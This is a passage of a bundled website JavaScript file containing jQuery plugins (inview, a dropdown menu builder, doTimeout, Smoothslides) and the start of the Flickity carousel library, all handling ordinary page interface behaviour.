            return this.unbind("mousewheel", a)
        }
    })
});

/**
 * author Christopher Blum
 *    - based on the idea of Remy Sharp, http://remysharp.com/2009/01/26/element-in-view-event-plugin/
 *    - forked from http://github.com/zuk/jquery.inview/
 */
(function(a) {
    if (typeof define == "function" && define.amd) {
        define(["jquery"], a)
    } else {
        if (typeof exports === "object") {
            module.exports = a(require("jquery"))
        } else {
            a(jQuery)
        }
    }
}(function(c) {
    var k = [],
        b, l, e = document,
        j = window,
        i = e.documentElement,
        a;
    c.event.special.inview = {
        add: function(d) {
            k.push({
                data: d,
                $element: c(this),
                element: this
            });
            if (!a && k.length) {
                a = setInterval(g, 250)
            }
        },
        remove: function(n) {
            for (var m = 0; m < k.length; m++) {
                var d = k[m];
                if (d.element === this && d.data.guid === n.guid) {
                    k.splice(m, 1);
                    break
                }
            }
            if (!k.length) {
                clearInterval(a);
                a = null
            }
        }
    };

    function h() {
        var n, d, m = {
            height: j.innerHeight,
            width: j.innerWidth
        };
        if (!m.height) {
            n = e.compatMode;
            if (n || !c.support.boxModel) {
                d = n === "CSS1Compat" ? i : e.body;
                m = {
                    height: d.clientHeight,
                    width: d.clientWidth
                }
            }
        }
        return m
    }

    function f() {
        return {
            top: j.pageYOffset || i.scrollTop || e.body.scrollTop,
            left: j.pageXOffset || i.scrollLeft || e.body.scrollLeft
        }
    }

    function g() {
        if (!k.length) {
            return
        }
        var o = 0,
            q = c.map(k, function(t) {
                var r = t.data.selector,
                    s = t.$element;
                return r ? s.find(r) : s
            });
        b = b || h();
        l = l || f();
        for (; o < k.length; o++) {
            if (!c.contains(i, q[o][0])) {
                continue
            }
            var m = c(q[o]),
                d = {
                    height: m[0].offsetHeight,
                    width: m[0].offsetWidth
                },
                n = m.offset(),
                p = m.data("inview");
            if (!l || !b) {
                return
            }
            if (n.top + d.height > (l.top + 92) && n.top < (l.top + 92) + (b.height - 92) && n.left + d.width > l.left && n.left < l.left + b.width) {
                if (!p) {
                    m.data("inview", true).trigger("inview", [true])
                }
            } else {
                if (p) {
                    m.data("inview", false).trigger("inview", [false])
                }
            }
        }
    }
    c(j).bind("scroll resize scrollstop", function() {
        b = l = null
    });
    if (!i.addEventListener && i.attachEvent) {
        i.attachEvent("onfocusin", function() {
            l = null
        })
    }
}));

/* primary menu */
(function($) {
    $.fn.menumaker = function(options) {
        var cssmenu = $(this),
            settings = $.extend({
                format: "dropdown",
                sticky: false
            }, options);
        return this.each(function() {
            $(this).find(".menu-button").on('click', function() {
                $(this).toggleClass('menu-opened');
                var mainmenu = $(this).next('ul');
                if (mainmenu.hasClass('open')) {
                    mainmenu.slideToggle().removeClass('open');
                } else {
                    mainmenu.slideToggle().addClass('open');
                    if (settings.format === "dropdown") {
                        mainmenu.find('ul').show();
                    }
                }
            });
            var $cssmenu = cssmenu.find('li ul').parent();
            $cssmenu.addClass('has-sub');
            $cssmenu.on('mouseenter', function() {
                var doc_w = $(document).width();
                var sub_pos = $(this).find('ul').offset();
                var sub_width = $(this).find('ul').width();
                if ((sub_pos.left + sub_width) > doc_w) {
                    $(this).find('ul').css('margin-left', '-' + ((sub_pos.left + sub_width) - doc_w) + 'px');
                }
            });
            multiTg = function() {
                cssmenu.find(".has-sub").prepend('<span class="submenu-button"></span>'); //<i class="oic-down-open-mini"></i>
                var sub_menu_event_mode = ozyCheckIsMobile() ? 'touchstart' : 'click';
                cssmenu.find('.submenu-button').on(sub_menu_event_mode, function() {
                    $(this).toggleClass('submenu-opened');
                    $(this).parents('li').toggleClass('sub-active'); //mobile fix//
                    if ($(this).siblings('ul').hasClass('open')) {
                        $(this).siblings('ul').removeClass('open').slideToggle();
                    } else {
                        $(this).siblings('ul').addClass('open').slideToggle();
                    }
                });
            };

            if (settings.format === 'multitoggle') multiTg();
            else cssmenu.addClass('dropdown');

            if (settings.sticky === true) cssmenu.css('position', 'fixed');
            resizeFix = function() {
                var mediasize = 1180;
                if ($(window).width() > mediasize) {
                    cssmenu.find('ul').show();
                }
                if ($(window).width() <= mediasize) {
                    cssmenu.find('ul').removeClass('open');
                    cssmenu.find('div.button').removeClass('menu-opened');
                }
            };
            resizeFix();
            return $(window).on('resize', resizeFix);
        });
    };
})(jQuery);

/*
 * jQuery doTimeout: Like setTimeout, but better! - v1.0 - 3/3/2010
 * http://benalman.com/projects/jquery-dotimeout-plugin/
 *
 * Copyright (c) 2010 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 */
(function($) {
    var a = {},
        c = "doTimeout",
        d = Array.prototype.slice;
    $[c] = function() {
        return b.apply(window, [0].concat(d.call(arguments)))
    };
    $.fn[c] = function() {
        var f = d.call(arguments),
            e = b.apply(this, [c + f[0]].concat(f));
        return typeof f[0] === "number" || typeof f[1] === "number" ? this : e
    };

    function b(l) {
        var m = this,
            h, k = {},
            g = l ? $.fn : $,
            n = arguments,
            i = 4,
            f = n[1],
            j = n[2],
            p = n[3];
        if (typeof f !== "string") {
            i--;
            f = l = 0;
            j = n[1];
            p = n[2]
        }
        if (l) {
            h = m.eq(0);
            h.data(l, k = h.data(l) || {})
        } else {
            if (f) {
                k = a[f] || (a[f] = {})
            }
        }
        k.id && clearTimeout(k.id);
        delete k.id;

        function e() {
            if (l) {
                h.removeData(l)
            } else {
                if (f) {
                    delete a[f]
                }
            }
        }

        function o() {
            k.id = setTimeout(function() {
                k.fn()
            }, j)
        }
        if (p) {
            k.fn = function(q) {
                if (typeof p === "string") {
                    p = g[p]
                }
                p.apply(m, d.call(n, i)) === true && !q ? o() : e()
            };
            o()
        } else {
            if (k.fn) {
                j === undefined ? e() : k.fn(j === false);
                return true
            } else {
                e()
            }
        }
    }
})(jQuery);

/*
Smoothslides 2.2.0 by Kevin Thornbloom is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
*/
! function(a) {
    a.fn.extend({
        smoothSlides: function(b) {
            function i() {
                document.all && !window.atob ? a("#" + e).find(".ss-slide:last").animate({
                    opacity: "0"
                }) : a("#" + e).find(".ss-slide:last").css({
                    transition: "all " + b.transitionDuration + "ms",
                    opacity: "0"
                })
            }

            function j() {
                var b = a("#" + e).find(".ss-slide:eq(-2) img").prop("alt");
                b ? a("#" + e).find(".ss-caption").css("opacity", "1").html(b) : a("#" + e).find(".ss-caption").css("opacity", "0")
            }

            function k() {
                var b = a("#" + e).find(".ss-slide:eq(-1) img").prop("alt");
                b ? a("#" + e).find(".ss-caption").css("opacity", "1").html(b) : a("#" + e).find(".ss-caption").css("opacity", "0")
            }

            function m() {
                var b = a(d).find(".ss-paginate a").length,
                    c = a(d).find("a.ss-paginate-current").index(),
                    e = c + 1;
                e >= b ? (a(d).find("a.ss-paginate-current").removeClass(), a(d).find(".ss-paginate a:eq(0)").addClass("ss-paginate-current")) : (a(d).find("a.ss-paginate-current").removeClass(), a(d).find(".ss-paginate a:eq(" + e + ")").addClass("ss-paginate-current"))
            }

            function n() {
                var b = a(d).find(".ss-paginate a").length,
                    c = a(d).find("a.ss-paginate-current").index(),
                    e = c - 1; - 2 >= e ? (a(d).find("a.ss-paginate-current").removeClass(), a(d).find(".ss-paginate a:eq(" + b + ")").addClass("ss-paginate-current")) : (a(d).find("a.ss-paginate-current").removeClass(), a(d).find(".ss-paginate a:eq(" + e + ")").addClass("ss-paginate-current"))
            }
            var c = {
                    effectDuration: 5e3,
                    transitionDuration: 500,
                    effectModifier: 1.3,
                    order: "normal",
                    autoPlay: "true",
                    effect: "zoomOut,zoomIn,panUp,panDown,panLeft,panRight,diagTopLeftToBottomRight,diagTopRightToBottomLeft,diagBottomRightToTopLeft,diagBottomLeftToTopRight",
                    effectEasing: "ease-in-out",
                    nextText: " \u25ba",
                    prevText: "\u25c4 ",
                    captions: "true",
                    navigation: "true",
                    pagination: "true",
                    matchImageSize: "true"
                },
                b = a.extend(c, b),
                d = this,
                e = a(this).attr("id"),
                f = b.effectDuration + b.transitionDuration,
                g = a(this).find("img").width(),
                h = .25 * (100 * b.effectModifier - 100);
            if (b.transitionDuration >= b.effectDuration && console.log("Make sure effectDuration is greater than transitionDuration"), a("#" + e).removeClass("smoothslides").addClass("smoothslides-on"), d.crossFade = function() {
                i(), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(1) rotate(0deg)"
                    })
                }, b.transitionDuration)
            }, d.zoomOut = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") rotate(1.5deg)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(1) rotate(0deg)"
                    })
                }, b.transitionDuration)
            }, d.zoomIn = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(1.1) rotate(-1.5deg)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") rotate(0deg)"
                    })
                }, b.transitionDuration)
            }, d.panLeft = function() {
                a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateX(" + h + "%)"
                }), i(), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateX(0%)"
                    })
                }, b.transitionDuration)
            }, d.panRight = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateX(-" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateX(0%)"
                    })
                }, b.transitionDuration)
            }, d.panUp = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%)"
                    })
                }, b.transitionDuration)
            }, d.panDown = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(-" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%)"
                    })
                }, b.transitionDuration)
            }, d.diagTopLeftToBottomRight = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(-" + h + "%) translateX(-" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%) translateX(0%)"
                    })
                }, b.transitionDuration)
            }, d.diagBottomRightToTopLeft = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(" + h + "%) translateX(" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%) translateX(0%)"
                    })
                }, b.transitionDuration)
            }, d.diagTopRightToBottomLeft = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(-" + h + "%) translateX(" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%) translateX(0%)"
                    })
                }, b.transitionDuration)
            }, d.diagBottomLeftToTopRight = function() {
                i(), a(this).find(".ss-slide:eq(-2)").css({
                    transition: "none",
                    transform: "scale(" + b.effectModifier + ") translateY(" + h + "%) translateX(-" + h + "%)"
                }), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(" + b.effectModifier + ") translateY(0%) translateX(0%)"
                    })
                }, b.transitionDuration)
            }, "true" == b.matchImageSize ? (a("#" + e).css("maxWidth", g), a("#" + e + " img").css("maxWidth", "100%")) : a("#" + e + " img").css("width", "100%"), a(this).children().each(function() {
                a(this).wrap('<div class="ss-slide"></div>')
            }), a.fn.smoothslidesRandomize = function(b) {
                return (b ? this.find(b) : this).parent().each(function() {
                    a(this).children(b).sort(function() {
                        return Math.random() - .5
                    }).detach().appendTo(this)
                }), this
            }, "random" == b.order ? a("#" + e).smoothslidesRandomize(".ss-slide") : a("#" + e + " .ss-slide").each(function() {
                a(this).prependTo("#" + e)
            }), a("#" + e + " .ss-slide:first").css("position", "relative"), "true" == b.autoPlay && a(".ss-slide:first", this).appendTo(this), a(this).wrapInner("<div class='ss-slide-stage'></div>"), a(".ss-slide", this).each(function() {
                a(this).css({
                    transition: "all " + b.effectDuration + "ms " + b.effectEasing
                })
            }), "true" == b.captions)
                if (a(d).append("<div class='ss-caption-wrap'><div class='ss-caption'></div></div>"), "true" == b.autoPlay) j();
                else {
                    var l = a("#" + e).find(".ss-slide:last img").prop("alt");
                    l ? a("#" + e).find(".ss-caption").css("opacity", "1").html(l) : a("#" + e).find(".ss-caption").css("opacity", "0")
                }
            "true" == b.navigation && a(d).append('<a href="#" class="ss-prev ss-prev-on">' + b.prevText + '</a><a href="#" class="ss-next ss-next-on">' + b.nextText + "</a>"), "true" == b.pagination && (a(d).append('<div class="ss-paginate-wrap"><div class="ss-paginate"></div></div>'), a(".ss-slide", d).each(function() {
                a(".ss-paginate", d).append('<a href="#"></a>')
            }), "true" == b.autoPlay ? a(".ss-paginate a:last", d).addClass("ss-paginate-current") : a(".ss-paginate a:first", d).addClass("ss-paginate-current"));
            var o = function() {
                if (document.all && !window.atob) d.crossFade();
                else if (a("#" + e).find(".ss-slide:eq(-2) img").attr("data-effect")) {
                    var c = a("#" + e).find(".ss-slide:eq(-2) img").attr("data-effect");
                    d[c]()
                } else {
                    effectArray = b.effect.split(",");
                    var f = effectArray[Math.floor(Math.random() * effectArray.length)];
                    d[f]()
                }
                j(), m()
            };
            if ("true" == b.autoPlay) {
                o();
                var p = setInterval(o, f)
            }
            a(".ss-prev, .ss-next, .ss-paginate", d).mouseover(function() {
                clearInterval(p)
            }).mouseout(function() {
                p = setInterval(o, f)
            }), a("#" + e).on("click", ".ss-next-on", function(c) {
                a(".ss-next-on", d).removeClass("ss-next-on"), a(d).find(".ss-slide:last").css({
                    transition: "all " + b.transitionDuration + "ms",
                    opacity: "0"
                }), j(), m(), setTimeout(function() {
                    a(d).find(".ss-slide:last").prependTo(a(".ss-slide-stage", d)).css({
                        opacity: "1",
                        transform: "none"
                    }), a(d).find(".ss-slide:last").css({
                        transition: "all " + b.effectDuration + "ms " + b.effectEasing,
                        transform: "scale(1) rotate(0deg)"
                    }), a(".ss-next", d).addClass("ss-next-on")
                }, b.transitionDuration), c.preventDefault()
            }), a("#" + e).on("click", ".ss-prev-on", function(c) {
                a(".ss-prev-on", d).removeClass("ss-prev-on"), a("#" + e).find(".ss-slide:first").css({
                    transition: "none",
                    opacity: "0"
                }).appendTo("#" + e + " .ss-slide-stage"), a("#" + e).find(".ss-slide:last").css("opacity"), a("#" + e).find(".ss-slide:last").css({
                    transition: "all " + b.transitionDuration + "ms",
                    opacity: "1"
                }), k(), n(), setTimeout(function() {
                    a(".ss-prev").addClass("ss-prev-on")
                }, b.transitionDuration), c.preventDefault()
            }), a("#" + e).on("click", ".ss-prev, .ss-next", function(a) {
                a.preventDefault()
            }), a("#" + e).on("click", ".ss-paginate a", function(b) {
                var c = a(this).index(),
                    d = a("#" + e + " .ss-paginate-current").index();
                if (d > c)
                    for (var f = d - c, g = 0; f > g; g++) a("#" + e).find(".ss-slide:first").appendTo("#" + e + " .ss-slide-stage");
                else if (c > d)
                    for (var f = c - d, g = 0; f > g; g++) a("#" + e).find(".ss-slide:last").prependTo("#" + e + " .ss-slide-stage");
                a("#" + e).find(".ss-paginate-current").removeClass(), a("#" + e).find(".ss-paginate a:eq(" + c + ")").addClass("ss-paginate-current");
                var h = a("#" + e).find(".ss-slide:eq(-1) img").prop("alt");
                h ? a("#" + e).find(".ss-caption").css("opacity", "1").html(h) : a("#" + e).find(".ss-caption").css("opacity", "0"), b.preventDefault()
            })
        }
    })
}(jQuery);

/*!
 * Flickity PACKAGED v2.0.9
 * Touch, responsive, flickable carousels
 *
 * Licensed GPLv3 for open source use
 * or Flickity Commercial License for commercial use
 *
 * http://flickity.metafizzy.co
 * Copyright 2017 Metafizzy
 */

! function(t, e) {
    "function" == typeof define && define.amd ? define("jquery-bridget/jquery-bridget", ["jquery"], function(i) {
        return e(t, i)
    }) : "object" == typeof module && module.exports ? module.exports = e(t, require("jquery")) : t.jQueryBridget = e(t, t.jQuery)
}(window, function(t, e) {
    "use strict";

    function i(i, o, a) {
        function h(t, e, n) {
            var s, o = "$()." + i + '("' + e + '")';
            return t.each(function(t, h) {
                var l = a.data(h, i);
                if (!l) return void r(i + " not initialized. Cannot call methods, i.e. " + o);
                var c = l[e];
                if (!c || "_" == e.charAt(0)) return void r(o + " is not a valid method");
                var d = c.apply(l, n);
                s = void 0 === s ? d : s
            }), void 0 !== s ? s : t
        }

        function l(t, e) {
            t.each(function(t, n) {
                var s = a.data(n, i);
                s ? (s.option(e), s._init()) : (s = new o(n, e), a.data(n, i, s))
            })
        }
        a = a || e || t.jQuery, a && (o.prototype.option || (o.prototype.option = function(t) {
            a.isPlainObject(t) && (this.options = a.extend(!0, this.options, t))
        }), a.fn[i] = function(t) {
            if ("string" == typeof t) {
                var e = s.call(arguments, 1);
                return h(this, t, e)
            }
            return l(this, t), this
        }, n(a))
    }

    function n(t) {
        !t || t && t.bridget || (t.bridget = i)
    }
    var s = Array.prototype.slice,
        o = t.console,
        r = "undefined" == typeof o ? function() {} : function(t) {
            o.error(t)
        };
    return n(e || t.jQuery), i
}),
    function(t, e) {
        "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? module.exports = e() : t.EvEmitter = e()
    }("undefined" != typeof window ? window : this, function() {
        function t() {}
        var e = t.prototype;
        return e.on = function(t, e) {
            if (t && e) {
                var i = this._events = this._events || {},
                    n = i[t] = i[t] || [];
                return n.indexOf(e) == -1 && n.push(e), this
            }
        }, e.once = function(t, e) {
            if (t && e) {
                this.on(t, e);
                var i = this._onceEvents = this._onceEvents || {},
                    n = i[t] = i[t] || {};
                return n[e] = !0, this
            }
        }, e.off = function(t, e) {
            var i = this._events && this._events[t];
            if (i && i.length) {
                var n = i.indexOf(e);
                return n != -1 && i.splice(n, 1), this
            }
        }, e.emitEvent = function(t, e) {
            var i = this._events && this._events[t];
            if (i && i.length) {
                i = i.slice(0), e = e || [];
                for (var n = this._onceEvents && this._onceEvents[t], s = 0; s < i.length; s++) {
                    var o = i[s],
                        r = n && n[o];
                    r && (this.off(t, o), delete n[o]), o.apply(this, e)
                }
                return this
            }
        }, e.allOff = function() {
            delete this._events, delete this._onceEvents
        }, t
    }),
    function(t, e) {
        "use strict";
        "function" == typeof define && define.amd ? define("get-size/get-size", [], function() {
            return e()
        }) : "object" == typeof module && module.exports ? module.exports = e() : t.getSize = e()
    }(window, function() {
        "use strict";

        function t(t) {
            var e = parseFloat(t),
                i = t.indexOf("%") == -1 && !isNaN(e);
            return i && e
        }

        function e() {}

        function i() {
            for (var t = {
                width: 0,
                height: 0,
                innerWidth: 0,
                innerHeight: 0,
                outerWidth: 0,
                outerHeight: 0
            }, e = 0; e < l; e++) {
                var i = h[e];
                t[i] = 0
            }
            return t
        }

        function n(t) {
            var e = getComputedStyle(t);
            return e || a("Style returned " + e + ". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"), e
        }

        function s() {
            if (!c) {
                c = !0;
                var e = document.createElement("div");
                e.style.width = "200px", e.style.padding = "1px 2px 3px 4px", e.style.borderStyle = "solid", e.style.borderWidth = "1px 2px 3px 4px", e.style.boxSizing = "border-box";
                var i = document.body || document.documentElement;
                i.appendChild(e);
                var s = n(e);
                o.isBoxSizeOuter = r = 200 == t(s.width), i.removeChild(e)
            }
        }

        function o(e) {
            if (s(), "string" == typeof e && (e = document.querySelector(e)), e && "object" == typeof e && e.nodeType) {
                var o = n(e);
                if ("none" == o.display) return i();
                var a = {};
                a.width = e.offsetWidth, a.height = e.offsetHeight;
                for (var c = a.isBorderBox = "border-box" == o.boxSizing, d = 0; d < l; d++) {
                    var u = h[d],
                        f = o[u],
                        p = parseFloat(f);
                    a[u] = isNaN(p) ? 0 : p
                }
                var v = a.paddingLeft + a.paddingRight,
                    g = a.paddingTop + a.paddingBottom,
                    m = a.marginLeft + a.marginRight,
                    y = a.marginTop + a.marginBottom,
                    E = a.borderLeftWidth + a.borderRightWidth,
                    S = a.borderTopWidth + a.borderBottomWidth,
                    b = c && r,
                    x = t(o.width);
                x !== !1 && (a.width = x + (b ? 0 : v + E));
                var C = t(o.height);
                return C !== !1 && (a.height = C + (b ? 0 : g + S)), a.innerWidth = a.width - (v + E), a.innerHeight = a.height - (g + S), a.outerWidth = a.width + m, a.outerHeight = a.height + y, a
            }
        }
        var r, a = "undefined" == typeof console ? e : function(t) {
                console.error(t)
            },
            h = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"],
            l = h.length,
            c = !1;
        return o
    }),
    function(t, e) {
        "use strict";
        "function" == typeof define && define.amd ? define("desandro-matches-selector/matches-selector", e) : "object" == typeof module && module.exports ? module.exports = e() : t.matchesSelector = e()
    }(window, function() {
        "use strict";
        var t = function() {
            var t = window.Element.prototype;
            if (t.matches) return "matches";
            if (t.matchesSelector) return "matchesSelector";
            for (var e = ["webkit", "moz", "ms", "o"], i = 0; i < e.length; i++) {
                var n = e[i],
                    s = n + "MatchesSelector";
                if (t[s]) return s
            }
        }();
        return function(e, i) {
            return e[t](i)
        }
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("fizzy-ui-utils/utils", ["desandro-matches-selector/matches-selector"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("desandro-matches-selector")) : t.fizzyUIUtils = e(t, t.matchesSelector)
    }(window, function(t, e) {
        var i = {};
        i.extend = function(t, e) {
            for (var i in e) t[i] = e[i];
            return t
        }, i.modulo = function(t, e) {
            return (t % e + e) % e
        }, i.makeArray = function(t) {
            var e = [];
            if (Array.isArray(t)) e = t;
            else if (t && "object" == typeof t && "number" == typeof t.length)
                for (var i = 0; i < t.length; i++) e.push(t[i]);
            else e.push(t);
            return e
        }, i.removeFrom = function(t, e) {
            var i = t.indexOf(e);
            i != -1 && t.splice(i, 1)
        }, i.getParent = function(t, i) {
            for (; t.parentNode && t != document.body;)
                if (t = t.parentNode, e(t, i)) return t
        }, i.getQueryElement = function(t) {
            return "string" == typeof t ? document.querySelector(t) : t
        }, i.handleEvent = function(t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }, i.filterFindElements = function(t, n) {
            t = i.makeArray(t);
            var s = [];
            return t.forEach(function(t) {
                if (t instanceof HTMLElement) {
                    if (!n) return void s.push(t);
                    e(t, n) && s.push(t);
                    for (var i = t.querySelectorAll(n), o = 0; o < i.length; o++) s.push(i[o])
                }
            }), s
        }, i.debounceMethod = function(t, e, i) {
            var n = t.prototype[e],
                s = e + "Timeout";
            t.prototype[e] = function() {
                var t = this[s];
                t && clearTimeout(t);
                var e = arguments,
                    o = this;
                this[s] = setTimeout(function() {
                    n.apply(o, e), delete o[s]
                }, i || 100)
            }
        }, i.docReady = function(t) {
            var e = document.readyState;
            "complete" == e || "interactive" == e ? setTimeout(t) : document.addEventListener("DOMContentLoaded", t)
        }, i.toDashed = function(t) {
            return t.replace(/(.)([A-Z])/g, function(t, e, i) {
                return e + "-" + i
            }).toLowerCase()
        };
        var n = t.console;
        return i.htmlInit = function(e, s) {
            i.docReady(function() {
                var o = i.toDashed(s),
                    r = "data-" + o,
                    a = document.querySelectorAll("[" + r + "]"),
                    h = document.querySelectorAll(".js-" + o),
                    l = i.makeArray(a).concat(i.makeArray(h)),
                    c = r + "-options",
                    d = t.jQuery;
                l.forEach(function(t) {
                    var i, o = t.getAttribute(r) || t.getAttribute(c);
                    try {
                        i = o && JSON.parse(o)
                    } catch (a) {
                        return void(n && n.error("Error parsing " + r + " on " + t.className + ": " + a))
                    }
                    var h = new e(t, i);
                    d && d.data(t, s, h)
                })
            })
        }, i
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/cell", ["get-size/get-size"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("get-size")) : (t.Flickity = t.Flickity || {}, t.Flickity.Cell = e(t, t.getSize))
    }(window, function(t, e) {
        function i(t, e) {
            this.element = t, this.parent = e, this.create()
        }
        var n = i.prototype;
        return n.create = function() {
            this.element.style.position = "absolute", this.x = 0, this.shift = 0
        }, n.destroy = function() {
            this.element.style.position = "";
            var t = this.parent.originSide;
            this.element.style[t] = ""
        }, n.getSize = function() {
            this.size = e(this.element)
        }, n.setPosition = function(t) {
            this.x = t, this.updateTarget(), this.renderPosition(t)
        }, n.updateTarget = n.setDefaultTarget = function() {
            var t = "left" == this.parent.originSide ? "marginLeft" : "marginRight";
            this.target = this.x + this.size[t] + this.size.width * this.parent.cellAlign
        }, n.renderPosition = function(t) {
            var e = this.parent.originSide;
            this.element.style[e] = this.parent.getPositionValue(t)
        }, n.wrapShift = function(t) {
            this.shift = t, this.renderPosition(this.x + this.parent.slideableWidth * t)
        }, n.remove = function() {
            this.element.parentNode.removeChild(this.element)
        }, i
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/slide", e) : "object" == typeof module && module.exports ? module.exports = e() : (t.Flickity = t.Flickity || {}, t.Flickity.Slide = e())
    }(window, function() {
        "use strict";

        function t(t) {
            this.parent = t, this.isOriginLeft = "left" == t.originSide, this.cells = [], this.outerWidth = 0, this.height = 0
        }
        var e = t.prototype;
        return e.addCell = function(t) {
            if (this.cells.push(t), this.outerWidth += t.size.outerWidth, this.height = Math.max(t.size.outerHeight, this.height), 1 == this.cells.length) {
                this.x = t.x;
                var e = this.isOriginLeft ? "marginLeft" : "marginRight";
                this.firstMargin = t.size[e]
            }
        }, e.updateTarget = function() {
            var t = this.isOriginLeft ? "marginRight" : "marginLeft",
                e = this.getLastCell(),
                i = e ? e.size[t] : 0,
                n = this.outerWidth - (this.firstMargin + i);
            this.target = this.x + this.firstMargin + n * this.parent.cellAlign
        }, e.getLastCell = function() {
            return this.cells[this.cells.length - 1]
        }, e.select = function() {
            this.changeSelectedClass("add")
        }, e.unselect = function() {
            this.changeSelectedClass("remove")
        }, e.changeSelectedClass = function(t) {
            this.cells.forEach(function(e) {
                e.element.classList[t]("is-selected")
            })
        }, e.getCellElements = function() {
            return this.cells.map(function(t) {
                return t.element
            })
        }, t
    }),
    function(t, e) {
        "function" == typeof define && define.amd ? define("flickity/js/animate", ["fizzy-ui-utils/utils"], function(i) {
            return e(t, i)
        }) : "object" == typeof module && module.exports ? module.exports = e(t, require("fizzy-ui-utils")) : (t.Flickity = t.Flickity || {}, t.Flickity.animatePrototype = e(t, t.fizzyUIUtils))
    }(window, function(t, e) {
        var i = t.requestAnimationFrame || t.webkitRequestAnimationFrame,
            n = 0;
        i || (i = function(t) {
            var e = (new Date).getTime(),
                i = Math.max(0, 16 - (e - n)),
                s = setTimeout(t, i);
            return n = e + i, s
        });
        var s = {};
        s.startAnimation = function() {
            this.isAnimating || (this.isAnimating = !0, this.restingFrames = 0, this.animate())
        }, s.animate = function() {
            this.applyDragForce(), this.applySelectedAttraction();
            var t = this.x;
            if (this.integratePhysics(), this.positionSlider(), this.settle(t), this.isAnimating) {
                var e = this;
                i(function() {
                    e.animate()
                })
            }
        };
        var o = function() {
            var t = document.documentElement.style;
